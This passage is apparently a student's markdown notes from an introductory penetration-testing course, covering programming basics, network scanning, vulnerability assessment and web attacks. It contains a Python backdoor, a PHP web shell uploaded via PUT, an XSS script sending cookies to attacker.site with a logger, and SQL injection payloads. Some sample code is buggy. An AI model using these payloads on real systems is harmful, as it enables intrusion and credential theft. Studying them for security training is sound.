int uservalue;
cout << "The value of variable sum is " << sum << endl;
cin >> uservalue;
```

#### (5/10) Operators - Study Guide

In C++ there are four main classes of operators:

- Arithmetic
- Relational
- Logical
- Bitwise

```
variable_name = expression;
```

Also:

```
x++;
x--;
```

Relational Operators:

They define a relationship between two values:

```
>, >=, <, <=, ==, !=
```

Logical Operators:

They define how previous relationships must be connected.

```
&&, ||, !
```

- Expressions that use relational or logical operators return 0 or false and 1 for true.
- 0 value converts to false
- non-zero values automatically converts to true

Bitwise operators:

Refer to testing, setting or shifting the actual bits in a byte or word.

```
&, |, ^, ~, >>, <<
```

#### (6/10) Iteration and Conditional Structures - Study Guide

- Useful to instruct the program to execute or to repeat a specific operation when some condition is matched.

| Selection | Iteration | Jump       |
|:----------|:----------|:-----------|
| if        | while     | break      |
| switch    | for       | continue   |
|           | do-while  | goto       |
|           |           | return     |

```
if (expression)
  statement;
else
  statement;
```

```
switch(expression) {
 case constant1:
  statement sequence
  break;
 case constant2:
  statement sequence
  break;
 default
 statement sequence
}
```

```
for(initialization;condition;increment) {
  statement
}

for ( ; ; ) {

}
```

```
while (condition) {
  statement;
}

do {

} while (condition);
```

```
goto label;
...
...
label:
```

#### (7/10) Pointers - Study Guide

- A pointer is a variable that holds a memory address. This address is the location of another object in memory.
- If a variable is a pointer, it must be declared in a different way.
- `type` defines the type of variable the pointer can point to.
- `*` is the complement of `&`. It returns the value located at the address of the following operator.

```
type *name;

x = &y; // places the value in memory pointed by y into x. So if y contains the memory address of another variable, x will have the same of that 3rd variable
```

#### (8/10) Arrays - Study Guide

An array is a collection of variables of the same type, which is accessed by an index.

- All arrays have 0 as an index of the first element

```
type var_name[size];

// Iterate

int x[20];
int i;

for (i=0; i<20; i++) {
  x[i] = i;
}
```

#### (9/10) Functions Study Guide

Functions are blocks of statements defined under a name.

```
type function_name(param1, param2, ...){
  statements;
}

// function with "formal" parameters
int sum(int x, int y) {
  int z;
  z = x + y;
  return(z);
}
```

In almost any programming language, there are two ways in which we can pass arguments to a function:

- By value
  - Copies the value of an argument into a parameter. Changes made to the parameter do not affect the argument
  - Code in the function does not alter the arguments used by the caller
  - It's a copy of the value of the argument passed into the function
  - What occurs inside the function has NO EFFECT on the variable provided by the caller
- By reference
  - The address of an argument (not the value) is copied into the parameter
  - Inside the function, the address is used to access the actual argument used in the call
  - Changes made to the parameter will affect the argument

```
void swap(int& x, int& y) {
  int temp;
  temp=*x;
  *x=*y;
  *y=temp;
}
```

#### <span style="color: red">LAB - (10/10) C++-assisted exploitation</span>

### Python (10 items)

#### (1/10) About Python - Study Guide

- Cross-platform
- Free
- Interpreted
- Usable in conjuction with components written in some other languages
- Uses whitespace and indentation to determine block structures
- Python does not use brackets to delimit a block, using indentation instead

#### (2/10) Variables and Types - Study Guide

- A delimiter isn't needed (as ';')
- There isn't the need to declar the type of a variable

```
x = 10
y = "hello"
```

Operators:

```
=, +, -, *, /, // (division, with results in truncation), ** (exponentiation), %
```

You can use:

```
"allow 'single' quotes"
'allow "double" quotes'
'''contain single and double quotes'''
```

String manipulation:

```
x = "Hello World!"
print(x[0])       # H
print(x[1])       # e
print(x[-1])      # !
print(x[0:3])     # Hel
print(x[4:])      # o World!
print(x[:])       # Hello World!
```

#### (3/10) Input / Output - Study Guide

```
user_input = input("Message ")
print("User's message:", user_input)
```

#### (4/10) Control Flow - Study Guide

- The following is interpreted as **False**: `0`, `False`, `None`, `""`, `[]`
- Everything else is considered as `True`
- Comparison and Logical operators: `<`, `<=`. `==`, `>`, `>=`, `!=`, `is`, `is not`, `in`, `not in`, `And`, `Or`, `Not`
- There isn't a `switch / case` statement

```
if expression:
  statement
else:
  statement
```

```
while condition:
  statements_block
post_while_statements
```

```
for item in sequence
  for_statements
post_for_statements
```

```
range(5) # contains values from 0 to 4
range(0,5) # 0, 1, 2, 3, 4
```

#### (5/10) Lists - Study Guide

- Ordered collections of any type of object
- The general form of a list is a comma-separated list of elements, embraced in square brackets
- Lists are mutable, elements can be modified by assignments
- Python implements many functions that can be used to modifyu a list:
  - `append`: append a new element to the target list
  - `extend`: allows to add one list to another
  - `insert`: add a new list element right before a specific index
  - `del`: delete list items or slices, indices are automatically updated
  - `remove`: it does not work with indices, instead it looks for a given value within the list and it removes that element
  - `.pop(i)`: removes the item at the given position
  - `.sort()`: sorts a list (items must be of the same type)
  - `.reverse()`: reverses the order of the elments in the list

```
simple_list = [1, 2, 3, 4, 5]
list = [1, 2, "els", 4, 5, "something, [0,9]]

x = [1, 2, 3, 4, "els", 5, 6]
del x[2]      # [1, 2, 4, "els", 5, 6]
del x[2]      # [1, 2, "els", 5, 6]
del x[2:]     # [1, 2]
x.remove(2)   # [1]
```

#### (6/10) Dictionaries - Study Guide

- Similar to associative arrays
- Mapping objects
- Instead of being indexed by numbers, dictionaries are using _keys_ for indexing elements
- We have some methods:
  - `.values()`: returns all the values stored in the dictionary
  - `.keys()`: returns all the keys stored in the dictionary
  - `.items()`: returns all the keys and values in the dictionary
- We can also check wif an specific item exists using the existing two following methods:
  - `key in dictionary`
  - `get(key, message)`: if the key exists, returns the associated value, otherwise prints the message passed as an parameter

```
dictionary = {'first': 'one', 'second': 2}
```

#### (7/10) Functions - Study Guide

- `function_name.__doc__` shows function description
- each call to a function creates a new local scope as well as the assigned names within a function that are local to that function
- global variables can ge used within the function, but to do that we need to insert the keyword  `global` followed by the variable name

```
def function_name(param1, param2, ...):
  """ function documentation """
  function_statements
  return expression
```

#### (8/10) Modules - Study Guide

- A module is a file that contains source code

```
from module_name import object_name1, object_name2, ...
from module_name import *
```

#### (9/10) Pentester Scripting - Study Guide

##### Network sockets

```
""" server.py """
""" Binds itself to a specific address and port and will listen for incoming TCP communications """

import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Default family socket, using TCP and the default socket type connection-oriented (SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)

print("Server started! Waiting for connections...")
connection, address = s.accept()                      # 'connection' is the socket object we will use to send and receive data, 'address' contains the client address bound to the socket
print('Client connected with address:', address)
while 1:                                              # maximum number of queued connections
  data = connection.recv(1024)
  if not data: break
  connection.sendall(b'-- Message Received --\n')
  print(data.decode('utf-8'))
connection.close()
```

```
nc <server_ip> <port>
```

```
""" client.py """
import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SVR_ADDR, SRV_PORT))
print("Connection established")

message = input("Message to send: ")
my_sock.sendall(message.encode())
my_sock.close()
```

##### Port Scanner

- Instad of using `connect()` we'll use `connect_ex()`, which returns - if the operation succedeed
- This script will use the full 3-way handshake

```
import socket

target = input('Enter the IP address to scan: ')
portrange = input('Enter the port range to scan (ex 5-200): ')

lowport = int(portrange.split('-')[0])
highport = int(portrange.split('-')[1])

print('Scanning host ', target, 'from port', lowport, 'to port', highport)

for port in range(lowport, highport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  status = s.connect((target, port))
  if (status ==0):
    print('*** Port', port, ' - OPEN ***')
  else:
      print('*** Port', port, ' - Closed ***')
  s.close()
```

##### Backdoor

The program simply binds itself to a NIC and a specific port (6666) and then waits for the client commands. Depending on the command received, it will return specific information to the client.

```
import socket, platform, os

SRV_ADDR = ""
SRV_PORT = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
connection, address = s.accept()

while 1:
  try:
    data = connection.recv(1024)
    except:continue

    if(data.decode('utf-8') == '1'):
      tosend = platform.platform() + " " + platform.machine()
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '2'):
      data = connection.recv(1024)
      try:
        filelist = os.listdir(data.decode('utf-8'))
        tosend = ""
        for x in filelist:
          tosend += "," + x
      except:
        tosend += "Wrong path"
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '0'):
      connection.close()
    connection, address = s.accept()
```

##### HTTP

Build a Python program that, given an IP address/hostname and port, verifies if the remote Web Server has the HTTTP method `OPTIONS` enabled.

If it does, it tries to enumerate all the other HTTP methods allowed.

```
import http.client

host = input('Host?')
port = input('Port?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('OPTIONS', '/')
  response = connection.getresponse()
  print("Enabled methods are: ", response.getheader('allow'))
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```


##### HTTP, GET request and check status code

```
import http.client

host = input('Host?')
port = input('Port?')
url = input('URL?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('GET', url)
  response = connection.getresponse()
  print("Enabled methods are: ", response.status)
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```

#### <span style="color:red"> LAB - (10/10) Python-assisted exploitation</span>

### Command Line Scripting (12 items)

#### (1/12) Bash Shell - Study Guide

- The main non-graphical tool to interact with the operating system is Shell
- In FreeBSD there is no GUI at all
- Other notable shells: ksh, zsh, dash

#### (2/12) Bash Environment - Study Guide

- Upon the start of the shell, the OS checks for the existenc of several files as
  - `~/.bashrc`, `~/.bash_login`, `~/.bash_profile`, `~/.bash_logout`
- Environment Variables can be viewd by typing `env`
- `PATH` is a relevant env variable, which has a format of `[location]:[location]:...:[location]`
- The `PATH` variable is one of the execution helpers

#### (3/12) Bash Commands and Programs - Study Guide

- Bash has some built-in commands that provide basic functionality
- Examples are: `fg`, `echo`, `set`, `while`
- Most commands that are used in everyday tasks are external mini-programs kept in `PATH` locations (use `which` to find the real location)
- `man` displays help about commands

#### (4/12) Bash Output Redirectors and Special Characters - Study Guide

- `~`: current user's home directory
- `*`: wildcard that can be used for choosing only certain types of files
- `$()`: will be evaluated before the whole statement and will become part of this statement
- Use `command > file.txt` format to create a file containing command's output
- Use `command >> file.txt` format to append containing command's output to an existing file
- `|`: pipe
- chaining commands is a quite powerful Bash feature, oneliners

```
file `ls /etc/*.conf | sort` > test.txt && cat test.txt | wc -l
```

#### (5/12) Bash Conditional Statements and Loops - Study Guide

- `chmod +x scriptname` so you can execute this script with `./scriptname`

```
echo '#!/bin/bash' > script.sh
echo 'ls /tmp | wc -l' >> script.sh
chmod +x script.sh
./script.sh
```

```
if <conditions>; then
<commands>
fi
```

```
if [ x ]; then
  docommand
elif [ y ]; then
  doothercommand
else
  dosomethingelse
fi
```

Conditional statements:

- `-eq`: equal
- `-ne`: not equal
- `-lt`: less than
- `-le`: less than or equal
- `-gt`: greater than
- `-ge`: greater than or equal

Loops:

```
#!/bin/bash

for i in $(ls); do
  echo item: $i
done
```

or:

```
#!/bin/bash
for i in `seq 1 10`;
do
  echo $i
done
```

While loop:

```
while [condition]; do command1; command2; done
```

for example:

```
while read line; do echo $line; done < file.txt
```

#### VIDEO - (6/12) Bash Scripting Part 1

Filters open ports from nmap output files

```
cat *.nmap | grep "open" | grep -v "filtered" | cut -d '/' -f 1 | sort -u | xargs | tr ' ' ',' > ports.txt
```

#### VIDEO - (7/12) Bash Scripting Part 2

Fingerprint potential applications:

```bash
cat domains.txt
domain1.com
domain2.com
```

alivecheck.sh:

```bash
#!/bin/bash

for protocol in 'http://' 'https://';do
  while read line;
  do
    code=$(curl -L --write-out "%{http_code}\n" --output /dev/null --silent --insecure $protocol$line)
    if [ $code = "000" ]; then
      echo "$protocol$line: not responding."
    else
      echo "$protocol$line: HTTP $code"
      echo "$protocol$line: $code" >> alive.txt
    fi
  done < domains.txt
done
```

#### (8/12) Windows Command Line - Study Guide

- `cmd.exe` or Windows Command Line is the Microsoft equivalent of the Linux Bash Shell.
- Its usual location is `C:\Windows\system32\cmd.exe`
- CMD relies mainly on built-in commands
- Some of the are: `dir`, `cls`, `move` or `del`

#### (9/12) Windows Environment - Study Guide

In Windows 10: `Control Panel` > `System and Security` > `System` > `Advanced System Settings`
- There are System variables (for all users) and for current user
- Windows does have a `PATH` variable too, where the executable directories are separated through the `;` symbol
-

#### (10/12) Windows Commands and Programs - Study Guide

- Windows CMD supports more built-in commands than the Linux one.
- If you would like to make your newly installed software executable from the command line, syou should place it within any of your `PATH` locations or change the `PATH` variable to contain its location

#### (11/12) Windows Output Redirectors and Special Characters - Study Guide

- Windows CMD is a less flexible scripting env than Bash
- PowerShell is better to create advanced scripts in Windows
- In order to access Windows' env variables: `%varname%`
- You can print env variables using `echo`, as in: `echo %PATH%`
- `set` allows you to view variables
- You can also create your own variables or temporarily modify existing ones
- Any modifications will not be permanent and will only exist in the current `cmd.exe` window
- Two different `cmd.exe` windows will not affect each other
- Output redirection also works in Windows, as in `echo aaa > file.txt` or the append version: `echo bbb >> file.txt`
- View files with `type` command: `type file.txt`
- Some ways of command chaining:
  - `command1 & command2`: execute both regardless of the result
  - `command1 && command2`: execute the 2nd one if the 1st one's execution succedded
  - `command1 | command2`: send output from the first command to the second one
  - `command1 || command2`: execute the 1st command, and if ti fails, execute the second one

#### (12/12) Windows Conditional Statements and Loops - Study Guide

- `.bat` files allow you to save larger command line scripts

```
SET x=123
if %x%==123 (echo true) # true
if %x%==xyz (echo true) # nothing is output
if %x%==xyz (echo true) else (echo "does not contain xyz")
```

For loop:

```
for %i in (*.*) do @echo FILE: %i
```

> `@`: hides the command propont and just display the output

## (3/3) Penetration Testing Basics

### Information Gathering (5 items)

#### (1/5) Introduction - Study Guide

- First and one of the most crucial phases of an engagement
- A pentester cannot leave any stone unturned
-

#### (2/5) Open-Source Intelligence - Study Guide

- Widening the attack surface
- Mounting targeted attacks
- Sharpening your tools in preparation for the next phases

Information Gathering from Social Networks
- CrunchBase: find detailed information about founders, investors, employees, buyouts and acquisitions

Government Sites
- System for Award Management
- GSA eLibrary

Whois database (also accesible through Linux command `whois`)
- Owner name
- Street addresses
- Email Address
- Technical Contacts

Browsing Client's sites
- Check products
- Services
- Technologies
- Company Culture

Discovering Emai Pattern
- `name.surname@company.com`
- `surname.name@company.com`
- Many email systems tend to inform the sender that mail was not delivered because it does not exit

#### (3/5) Subdomain Enumeration - Study Guide

- We keep on widening the attack surface, discovering as many websites owned by the company as possible
- It's common for websites of the same company to share the same top-level domain name
- Likely to find resources that
  - May contain outdated software
  - Buggy software
  - Administrative Interfaces
- Bug bounty program writeups
- **Passive domain enumeration**: try to identify subdomains without directly interacting with the target
- Google: `site: company.com`
- [dnsdumpster.com](https://dnsdumpster.com)
- `sublist3r` (kali): `sublist3r -d [domain] flag` searches for subdomains in various sources

#### <span style="color:red">(4/5) VIDEO - Subdomain Enumeration</span>
#### (5/5) The Importance of Information Gathering - Study Guide

- Good vs Bad penentration tester
- Darts example: better 1000 shots at a microscopic target or single shot to an impossible to miss big target?
- Cyclic process
- Every information gathering stage will need the same focus and dedication as the first one
- Your penetration test will be **as strong as your weekest skill**!

### Footprinting & Scanning (7 items)

#### (1/7) Disclaimer - Study Guide

> Never run any of these tools and techniques on any machine or netwrok without proper authorization!

#### (2/7) Mapping a Network - Study Guide

- These techniques work both on local and remote
- Every host connected to the Internet or a private network must have a unique IP address

Example:

```
Block: 200.200.0.0/16
2^16 hosts = 200.200.0.0 - 200.200.255.255
```

##### Ping Sweeping

- `ping` command tests whether a machine is alive
- Ping works by sending one or more special ICMP packets (**echo request** - Type 8)
- If the destination host replies with **ICMP echo reply**
- ICMP is part of the IP protocol

- `fping` is an improved version of the `ping` utility

```
fping -a -g IPRANGE

# -a option forces the tool to show only alive hosts
# -g option tells the tool we want to perform a ping sweep instead of standard ping

fping -a -g 10.54.12.0/24
fping -a -g 10.54.12.0 10.54.12.255
```

- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`)
- Those messages are easily removed by:

```
fping -a g 192.168.82.0 192.168.82.255 2>/dev/null
```

##### Nmap Ping Scan

```
nmap -sn 200.200.0.0/16
nmap -sn -iL hostilist.txt
```

```
HOST DISCOVERY:
-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
```

##### OS Fingerprinting

- Possible to identify OS because of some tiny differences in the network stack implementation of the various OS
- Signature of the host behavior
- The signature is compared against a database of known OS signatures
- Offline OS fingerpriting can be done with `p0f` but we'll use `nmap`

```
nmap -Pn -O <target(s)>
# -Pn switch to skip the ping scan if you already know that the targets are alive
```

Nmap options:
```
OS DETECTION:
-O: Enable OS detection
--osscan-limit: Limit OS detection to promising targets
--osscan-guess: Guess OS more aggresively
```

#### <span style="color:red">(3/7) NMAP OS Fingerprinting</span>

#### (4/7) Port Scanning - Study Guide

> Goals:
> - Prepare for the vulnerability assessment phase
> - Perform stealth reconnaissnace
> - Detect firewalls

- Port Scanning goes after knowing the active targets on the network
- Determine what TCP/UDP ports are opened
- Also knowing what services are running, software and version, on an specific port
- Port scanners automate probes requests and response analysis
- Also let you detect if there's a firewall between you and your target
- 3-way handshake:
  - If port is closed -> RST + ACK

##### TCP Connect Scan

- Simplest way to perform a port scan
- If the scanner receives a `RST` packet, then the port is closed
- If the scanner is able to complete the connection, then the port is open
- TCP Connect Scans are recoded in the daemon logs (from the app point of view, the probe looks like a legitimate connection)

##### TCP SYN Scan

- Default nmap scan
- Stealthy by design
- Sends a SYN packet and analyzes the response coming from the target machine
- If a RST packet is received, then port is closed
- if a ACK packet is recevived, then the port is open (and RST packet is sent to the target to stop the handshake)
- Cannot be detected by looking at daemons logs

##### Nmap Scan Types

```
-sT performs a TCP connect scan
-sS performs a SYN scan
-sV performs a version detection scan
```

- `-sV` version detection scan mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port, which isn't stealthy but useful.
- During version detection scan, Nmap performs a TCP connect and reads from the banner of the daemon listening on a port.
- If the daemon does not send a banner, nmap sends some probes to understand what application is, by studying its behavior

###### Specifying targets

- By DNS name: `nmap <scan_type> target1.domain.com target2.domain.com`
- With an IP address list: `namp <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3`
- CIDR notation: `nmap <scan_type> 192.168.1.0/24 200.200.1.0/16`
- By using wildcards: `nmap <scan_type> 192.168.1.*` or `nmap <scan_type> 10.10.*.1` or `nmap <scan_type> 200.200.*.*`
- Specifying ranges: `nmap <scan_types> 200.200.6-12.*`
- Octets Lists: `nmap <scan_types> 10.14.33.1,3,17` or `nmap <scan_type> 10.14,20.3.1,3,17,233`

###### Choosing the ports to scan

- `-p`: `nmap -p 21,22,139,445,443,80 <target>` or `nmap -p 100-1000 <target>`

##### Discovering Network with Port Scanning

- You might encounter networks that are protected by firewalls and where pings are blocked
- It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open
- `-Pn`: forces the scan on a server
- if you would like to find an alive host, you can scan typical ports instead of performing a ping sweep
- the four most basic TCP ports (22, 445, 80, 443) can be used as indicators of live hosts in the network

##### Spotting a Firewall

- You might often see that a version was not recognized regardless of the open port
- Or even the service type is not recognized
- `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data
- `--reason` nmap flag will show an explanation of twhy a port is marked as open or closed

##### Masscan

- Another interesting tool that can help you to discover a network via probing TCP ports
- Designed to deal with large networks and to scan thousands of IP addresses at once
- Like `nmap` but a lot faster, however is less accurate
- Maybe best to use this for host discovery and then conduct a detailed scan with nmap against certain hosts

#### <span style="color:red">VIDEO - (5/7) NMAP Port Scanning</span>
#### <span style="color:red">VIDEO - (6/7) Basic Masscan Usage</span>
#### <span style="color:red">LAB - (7/7) Scanning and OS Fingerprinting</span>

### Vulnerability Assessment (4 items)

#### (1/4) Vulnerability Assessment - Study Guide

> Goal #1: Identify vulnerabilities and security misconfigurations
> Goal #2: Prepare yourself for exploitation phase

- Vulnerability assessment is a phase of the penetration testing process.
- Sometimes customers just asks for a vulnerability assessment instead of a pentest
- During the vulnerability assessment, you do not proceed to the exploitation phase
- This impllies that you will not be able to confirm the vulnerabilities by testing them and giving proof of their existence
- A full penetration test is more in depth than just vulnerability assessment
- Can be carried out both locally and remotely
- Pentesters use vulnerability scanners
  - Database of known vulnerabilities
  - Daemons listening on TCP and UDP ports
  - Config files of OS, software suites, network devices, etc.
  - Windows registry entries
  - The purpose of a scanner is to find vulnerabilities or misconfigurations
  - This scanner tool is up to date by the vendor and it's constantly updated

- OpenVAS
- Nexpose
- GFI Lan Guard
- Nessus

- If you have to test a custom app, a vulnerability scanner isn't enough, you have to test it manually
- Studying custom applications means:
  - learning and understanding its features
  - understanding how it exchanges data over the network
  - understanding how it accesses resources like databases, servers, local and remote files and os on
  - reverse engineering its logic

#### (2/4) Nessus - Study Guide

- Nessus is a easy to use powerful vulnerability scanner that works great both on a small and large company network
- It's free license for non-commercial use, so you can install and use it to secure your home network
- It has two components: client & server
  - Client is used to configure the scans, provides a web interface to configure scans
  - Server performs the scan and repots back to the client, sends probes to systems and applications, collecting the responses and matching them against its vulnerability database

These are the steps that a vulnerability scanner uses:
- Target hosts alive
- Open ports
- Service detection
- For each detected service, the scanner queries its database looking for known vulnerabilites
  - You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities
- Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives

#### <span style="color:red">VIDEO - (3/4) Nessus</span>
#### <span style="color:red">LAB - (4/4) Nessus - Lab</span>

### Web Attacks (16 items)

#### (1/16) Introduction - Study Guide

Web applications use different technologies and programming paradigms compared to desktop apps

#### (2/16) Web Server Fingerprinting - Study Guide

- Webapps often make up the vast majority of the internet-facing surface
- It can be done manually and by using automatic tools
- Fingerprinting a web server means:
  - Web Server Service: IIS, Apache, nginx
  - Version
  - OS hosting the server

# Fingerprinting with Netcat

- Manually send requests to the server
- Banner grabbing:

```bash
nc <target_address> 80
HEAD / HTTP/1.0
```

Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
- Write the request in uppercase always
- Netcat does not notify you after the connection to the server
- You must write your request after running the command (or use `-v`)
- Netcat does not perform any kind of encryption, so you cannot use it for HTTPS

##### Fingerprinting with OpenSSL

- `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
- You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:

```bash
open s_client -connect target.site:443
HEAD / HTTP/1.0
```

##### Fingerprinting with Httprint

- `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers

```bash
httpprint -P0 -h <target hosts> -s <signature file>
# -PO to avoid pinging the host
# -h <target hosts> tells the tool to fingerprint a list of hosts, it is advised to use the IP address of the hosts you want to test
# -s set the signature file to use
```

#### (3/16) HTTP Verbs - Study Guide

- REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
- In REST APIs is common to use PUT for saving data, and not for saving files
- If you confirm a PUT or DELETE during an engagement, you should confirm its exact impact twice

```
# GET is used to request a resource
GET /page.php HTTP/1.1
Host: www.example.site

# You can also pass arguments to the web application
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site

# POST is used to submit HTML form data
# POST parameters must be in the message body
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass

# HEAD is very similar to GET, as it asks just headers of the response instead of the response body
HEAD / HTTP/1.1
Host: www.example.site

# PUT is used to upload a file to a server
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT DATA>

# DELETE is used to remove a file from the server
# Must be configured wisely as it might lead to DoS and data loss
DELETE /path/to/destination HTTP/1.1
Host: www.example.site

# OPTIONS is used to query the web server for enabled HTTP Verbs
OPTIONS / HTTP/1.1
Host: www.example.site
```

##### Exploiting Misconfigured HTTP verbs

- 1st you enumerate verbs with an OPTIONS message in `nc`
- To exploit the DELETE verb, you just have to specify the file you want to delete from the server
- Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content length: 20

<?php phpinfo(); ?>
```

##### PHP Shell

```php
if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
```

Then you could do with `nc`:

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
```

- Misconfigured HTTP verbs are becoming rare in web servers
- You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices

#### <span style="color: red">VIDEO - (4/16) Netcat</span>

#### (5/16) Directories and Files Enumeration - Study Guide

> Ability to:
> - Find and utilize testing features
> - Exploit information saved in backup or old files
> - Find hidden resources

Enumeration helps you find those "hidden" resources that often contain:
- New and untested features
- Backup files
- Testing information
- Developer's notes

Two ways of enumerating resources:
- Pure brute-force
- Dictionary attacks

Tool:
- OWASP Dirbuster
  - Java application that can perform web resources enumeration
  - You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
  - It's Linux alternative: `dirb`

#### <span style="color:red">VIDEO - (6/16) Dirbuster</span>
#### <span style="color:red">VIDEO - (7/16) Dirb</span>
#### <span style="color:red">LAB - (8/16) Dirbuster</span>
#### (9/16) Google Hacking - Study Guide

> Goal #1: perform information gathering without contacting your targets, ability to find hidden resources

- Usage of Google Dorks (ex `inurl:admin intitle:login`)

`site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`

```
inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```

- [Exploit DB](https://www.exploit-db.com/google-hacking-database)

#### (10/16) Cross Site Scripting - Study Guide

> Ability to:
> - Attack webapps' users
> - Control webapps' content
> - Gain advanced web attacks skills

- XSS is a vulnerability that lets an attacker control some of the content of a webapp
- XSS vulnerabilities happen when a webapp uses unfiltered user input to build the output content displayed to its end users, letting an attacker control the output HTML and JS code, targeting the app's users (admin is included)
- XSS involves injecting malicious code into the output of a webpage, this malicious code is the rendered (or executed) by the browser of the visiting users
The attacker can target the webapp's users, and:
  - Modify the content of the site at run-time
  - Inject malicious contents
  - Steal the cookies, thus the session of a user
  - Perform actions on the web application as if it was a legitimate user

 User input is any parameter coming from the clientside of the webapp, as:
  - Request headers
  - Cookies
  - Form inputs
  - POST parameters
  - GET paramaters

 Actors of a XSS attack:
 - Vulnerable website
   - inputs should always be validated server side
   - never ever trust user input
 - User/visitor (victim)
   - Code executed/rendered by the browser of the visiting users
   - XSS has low priority for developers, which shouldn't be
   - it can be really hard for a victim to realiza that an attack is in progress
 - The pentester, launching attacks:
   - Making their browsers load malicous content
   - Performing operations on their behalf, like buying a product or changing a password
   - Stealing the session cookies, thus being able to impersonate them on the vulnerable site
   - If stolen user is an admin, the entire website can be impersonated

- Reflection Point: When a search parameter is submitted thorugh a form and gets displayed on the output
- After finding a reflection point, you have to underswtand if you can inject HTML code and see if it somehow gets to the output of the page
- Test XSS: `<script>alert('XSS')</script>`

XSS Types:
- Reflected
  - When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
  - When users click on the link , the users trigger the attack
  - `http://victim.site/search.php?find=<payload>`
  - Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
  - Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones
- Persistent
  - Occur when the payload is sent to the vulnerable web server and then stored.
  - When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
  - The malicious code gets delivered each and every time a web browser hits the "injected" web page
  - A single attack can exploit multiple web applications
  - The most common vector for persistent attacks are HTML forms that submit conetnt to the web server and then display that content back to the users
  - Element such as comments, user profiles, and forum posts are potential vector for XSS attacks
- DOM Based

Cookie Stealing via XSS
- When `HttpOnly` flag is disabled, cookies can be stolen
- `<script>alert(document.cookie)</script>`
- With the following code, you can send cookies content to an attacker-controlled site:

```javascript
<script>
  var i = new Image();
  i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>
```

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
flocse($fp);
?>
```

- [OWASP-XSS](https://owasp.org/www-community/attacks/xss/)

#### <span style="color:red">VIDEO - (11/16) XSS</span>
#### <span style="color:red">LAB (12/16) Cross site scripting</span>

#### (13/16) SQL Injections - Study Guide

- They allow an unathorized user to take control over SQL statements used by a web application.
- This kind of attack has a huge impact on a web site because getting contorl over a backend database means controlling:
  - User's credentials
  - Data of the web application
  - Credit Card numbers
  - Shopping transactions

##### SQL basics

An application performs this tasks:
- Connect to the DB
- Submit the query to the database
- Retrieve the results

```sql
-- SELECT <columns list> FROM <table> WHERE <conditions>;
SELECT name, description FROM products WHERE id=9;

-- UNION command performs a union between
<SELECT statement> UNION <other SELECT statement>;
```

##### Vulnerable Dynamic Queries

This dynamic query expects $id values as a string:

```sql
SELECT Name, Description FROM Products WHERE ID='$id'
```

But what if an attacker crafts a $id value which can change the query to something like: ` OR 'a'='a`

Then the query becomes:
```sql
SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
```

Which tells the database to select the items by checking two conditions wich is always true.

An attacker could also exploit the UNION command by supplying the following:

```sql
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
```

Thus it changes the original query to:

```sql
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

To find SQL injections, we need to check any user input (every input must be tested to conduct a professional pentest):
- GET parameters
